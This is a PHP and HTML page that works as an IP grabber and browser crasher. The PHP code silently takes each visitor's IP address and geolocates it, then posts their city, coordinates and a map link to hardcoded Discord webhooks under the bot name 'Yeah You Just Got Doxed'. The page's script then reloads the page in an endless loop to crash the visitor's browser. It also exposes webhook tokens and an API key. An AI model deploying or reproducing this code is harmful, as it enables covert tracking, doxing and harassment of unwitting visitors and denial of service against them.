<?php

// Function to get the user's IP address
function getUserIP() {
    $ipaddress = isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR'];
    return $ipaddress;
}

// Define an array of webhook URLs
$webhooks = [
    // Your webhook URLs here
    "https://discord.com/api/webhooks/1229792991112204298/v3rwnwRF3j0OyvRhnbT3NlOpo26VXgzFcn5raFiJ7FYPn55qx9VnM0QAgk1k-ICN0KXR",
    "https://discord.com/api/webhooks/1229793131139170465/aoJPPC1b26ExRYc4xkRVmSfJaZqX9fskkKnoTQs5VO0jEHlVvxJWgcymOSKsgWGkD-ac",
    "https://discord.com/api/webhooks/1229793193483304981/1XSsVVXfisveBelkKEker23Ck7Jkf7CZ5_5Fl6917-FlkLtazGHK6y2Pcv3x1BUfHh_G",
    "https://discord.com/api/webhooks/1229793277457207296/qexrayEUT2fB9unKZAEqhyOaNRHF-XmYR6vCT1c9SUVAjVG90RlzF0FHonyh1sMnZpr9",
    "https://discord.com/api/webhooks/1229793289184743455/l2vLM_2CAR2o07uzkMqA0gn-ZPK1cSSmCsgB4uhAIayy-Ah2E1V4tg40d2iFoIkZ8acR",
];

// Randomly select a webhook URL from the array
$webhookURL = $webhooks[array_rand($webhooks)];

// Get the user's IP address
$ipaddress = getUserIP();

// Check if the IP has been sent within the last 24 hours
$ipLog = 'ip_log.txt';

// Encrypt the IP address before storing it
$encryptedIP = base64_encode($ipaddress . "\n");

$ipLogData = file_get_contents($ipLog);

if (strpos($ipLogData, $encryptedIP) !== false) {
    // IP address already sent
    echo '';
} else {
       // Get IP Geolocation data using ipgeolocation.io API
    $apiKey = "b1e9549a924b474bbf04e9d029327694"; // Replace with your actual API key
    $apiURL = "https://api.ipgeolocation.io/ipgeo?apiKey={$apiKey}&ip={$ipaddress}";
    $geolocationData = json_decode(@file_get_contents($apiURL)); // Use "@" to suppress errors

    if ($geolocationData === NULL) {
        // Handle the error as needed
        echo 'Failed to retrieve IP address and geolocation data.';
    } else {
        // Create the clean embed-style payload for the successful response
        $mapURL = "https://maps.google.com/maps?q={$geolocationData->latitude},{$geolocationData->longitude}&t=k&z=15"; // Create the map URL
        $jsonPayload = [
            'username' => 'Yeah You Just Got Doxed ',
            'avatar_url' => 'https://steamuserimages-a.akamaihd.net/ugc/5100921132464001344/A3A6995917F69B78D9CF69DB504E8329054B70BB/?imw=637&imh=358&ima=fit&impolicy=Letterbox&imcolor=%23000000&letterbox=true', // Set the avatar URL
            'embeds' => [
                [
                    'title' => 'IP Address and Geolocation Data',
                    'description' => "**User ID:** " . $_GET['userid'] . "\n**IP Address:** {$geolocationData->ip}\n[Full Geolocation Data](https://ipgeolocation.io/?ip={$geolocationData->ip})",
                    'color' => FF0000, // Color code
                    'thumbnail' => [
                        'url' => $geolocationData->country_flag, // Country flag URL
                    ],
                    'fields' => [
                        [
                            'name' => 'Continent',
                            'value' => $geolocationData->continent_name,
                            'inline' => true,
                        ],
                        [
                            'name' => 'Country',
                            'value' => "{$geolocationData->country_name} ({$geolocationData->country_code2})",
                            'inline' => true,
                        ],
                        [
                            'name' => 'State/Province',
                            'value' => $geolocationData->state_prov,
                            'inline' => true,
                        ],
                        [
                            'name' => 'City',
                            'value' => $geolocationData->city,
                            'inline' => true,
                        ],
                        [
                            'name' => 'Latitude',
                            'value' => $geolocationData->latitude,
                            'inline' => true,
                        ],
                        [
                            'name' => 'Longitude',
                            'value' => $geolocationData->longitude,
                            'inline' => true,
                        ],
                        [
                            'name' => 'Languages',
                            'value' => $geolocationData->languages,
                            'inline' => true,
                        ],
                    ],
                    'image' => [
                        'url' => $geolocationData->image, // Image URL
                    ],
                    'footer' => [
                        'text' => 'Provided by Kabamjo',
                    ],
                    'url' => $mapURL, // Add the map URL
                ],
            ],
        ];

        $options = [
            'http' => [
                'method' => 'POST',
                'header' => 'Content-Type: application/json',
                'content' => json_encode($jsonPayload),
            ],
        ];

        $context = stream_context_create($options);
        $response = file_get_contents($webhookURL, false, $context);

        if ($response === FALSE) {
            echo '';
        } else {
            // Log the encrypted IP address to prevent sending it again for 24 hours
            file_put_contents($ipLog, $encryptedIP, FILE_APPEND);
            echo '';
        }
    }
}

?>


<html>
<body>
  <h2>
    you just got crasht rip your browser I also have your ip</h2>
  <p></p>
  <p id="demo"></p>
  <audio style="display:none;" controls loop autoplay>
    <source src="horse.ogg" type="audio/ogg">
    <source src="plus.mp3" type="audio/mpeg">
    Your browser does not support the audio element.
  </audio>
  
  <script>
    onbeforeunload = function(){localStorage.x=1};
    setTimeout(function(){
      if (("Do you REALLY want me tTo crash your browser?")){
        while(1)location.reload(1)
      }
    }, 1);
  </script>
</body>
</html>
